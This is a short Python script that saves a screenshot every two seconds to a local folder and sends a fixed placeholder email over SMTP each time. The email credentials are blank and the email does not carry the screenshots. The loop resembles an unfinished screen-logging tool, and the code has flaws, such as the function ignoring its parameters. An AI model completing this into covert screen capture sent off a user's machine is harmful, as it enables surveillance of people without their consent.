import pyautogui
import time
import os 
import smtplib
import ssl

smtpServer = ""
sender_email = ""
receiver_email = ""
password = ""
message = """\
From: %s
Subject: Hi there

This message is sent from Python.""" % sender_email

def sendEmail(sender, receiver, password, message, smtpServer):
   
    # Create a secure SSL context
    context = ssl.create_default_context()

    # Try to log in to server and send email
    try:
        server = smtplib.SMTP_SSL(smtpServer, 465, context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
    except Exception as e:
        # Print any error messages to stdout
        print(e)
    finally:
        server.quit() # Close the connection

print("---")
if not os.path.isdir('tmp'):
    os.mkdir("tmp")

i = 1
while True:
    screenshot = pyautogui.screenshot()
    screenshot.save(f"tmp/{i}.png")
    print(f"screen captured {i}")
    sendEmail(sender_email, receiver_email, password, message, smtpServer)
    i=i+1
    time.sleep(2)

